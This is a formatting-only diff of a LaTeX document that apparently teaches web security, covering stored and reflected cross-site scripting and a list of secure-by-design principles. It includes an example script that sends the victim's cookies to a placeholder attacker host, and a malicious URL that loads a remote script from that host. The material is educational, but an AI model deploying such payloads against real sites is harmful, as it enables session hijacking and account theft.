@@ -440,8 +440,8 @@ vulnerability is present, it will not be displayed on the page, but it will be
 executed. It could be simple like:
 
 \begin{minted}{html}
-<script>document.createElement('img').src = 'http://attackerswebsite.com/' +
-document.cookie</script>
+<script>document.createElement('img').src =
+	'http://attackerswebsite.com/' + document.cookie</script>
 \end{minted}
 
 This script would create an HTTP request to attacker's website with the victim's
@@ -453,8 +453,7 @@ possible to include much bigger scripts with:
 \end{minted}
 
 The reflected attack works by reflecting the injected code off the trusted
-website.  For example, an attacker might send an URL with malicious code to the
-victim, e.g:
+website. For example, an attacker might send a malicious URL to the victim, e.g:
 \texttt{http://website.com/<script\%20src="http://attackerswebsite.com/
 evilscript.js"></script>}. The URL itself is not dangerous, but the vulnerable
 website might show an error message containing the URL, thus embedding it and
@@ -477,44 +476,44 @@ future. This idea known as security by design is based on several security
 principles:
 
 \begin{itemize}
-	\item \textbf{Minimize attack surface area}
+	\item \textbf{Minimize attack surface area} \\
 		The more features an application has, the higher the risk of it
 		being vulnerable to exploits because the attack surface area is
 		bigger. It is encouraged to add only necessary functions and
 		make them simple.
-	\item \textbf{Establish secure defaults}
+	\item \textbf{Establish secure defaults} \\
 		It means making security measures on by default, but allowing to
 		disable them, if a user wishes to.
-	\item \textbf{Principle of Least privilege}
+	\item \textbf{Principle of Least privilege} \\
 		Every entity in the application should have just as many
 		privileges and resources as they need to perform their actions
 		and no more than that.
-	\item \textbf{Principle of Defense in depth}
+	\item \textbf{Principle of Defense in depth} \\
 		The defense should be created by layered security mechanisms, so
 		if one of them becomes broken, the other ones may still prevent
 		the attack.
-	\item \textbf{Fail securely}
+	\item \textbf{Fail securely} \\
 		If a security mechanism fails and throws exceptions, it should
 		still serve its purpose and block the request that caused the
 		error.
-	\item \textbf{Don't trust services}
+	\item \textbf{Don't trust services} \\
 		When an application is using the third party services, it
 		should be careful just like with any other external system.
 		These services could have different, perhaps worse security and
 		might get compromised. Trusting them too much creates a risk
 		for the app.
-	\item \textbf{Separation of duties}
+	\item \textbf{Separation of duties} \\
 		Every user of the application has his role (e.g. administrator,
 		client) and capabilities. An account with one role should not
 		have the functionality of another role.
-	\item \textbf{Avoid security by obscurity}
+	\item \textbf{Avoid security by obscurity} \\
 		Application's security should not rely on keeping secrets, like
 		being closed source or using custom cipher algorithm. It should
 		be also using other security mechanisms.
-	\item \textbf{Keep security simple}
+	\item \textbf{Keep security simple} \\
 		Simple code is more secure and faster than a complex one, as it
 		minimizes the attack surface area.
-	\item \textbf{Fix security issues correctly}
+	\item \textbf{Fix security issues correctly} \\
 		When a security bug is found, it is important to understand how
 		it is working, analyze it and test. All other components
 		affected by this issue should be also checked to make sure they
